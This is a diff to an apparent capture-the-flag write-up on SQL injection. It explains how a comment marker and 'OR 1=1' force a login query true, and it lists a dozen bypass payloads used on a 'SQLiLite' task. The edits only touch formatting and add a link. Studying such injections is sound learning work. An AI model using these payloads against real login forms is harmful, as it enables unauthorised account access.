@@ -56,10 +56,10 @@ SELECT * FROM users WHERE name='' OR 1=1;/*' AND password='PASSWORD'
 ```
 
 
- \
-`/*` – Everything that follows this part will be considered a comment and will not be executed. Although `name='' ` is empty, the condition `OR 1=1 ` will force the entire expression to be *true*.
+`/*` – Everything that follows this part will be considered a comment and will not be executed. Although `name='' ` is empty, the condition `OR 1=1` will force the entire expression to be *true*.
 
-Taking into account the three rules above, you can construct injections yourself, which I did while completing the `SQLiLite` task: \
+Taking into account the three rules above, you can construct injections yourself, which I did while completing the [SQLiLite](../content/Web%20Exploitation/SQLiLite.md) task:  
+
 <pre class="prettyprint">
 ' OR 1=1 --";
 ' OR 1=1;--' 
@@ -73,7 +73,8 @@ Taking into account the three rules above, you can construct injections yourself
 232435.11' or 12312.22 /* # every int/float/double number passes
 ' OR 1=1 --"
 1' OR 12666;%00 # every int/float/double number passes
-33' OR 1=1 -- </pre>
+33' OR 1=1 -- 
+</pre>
 
 
 
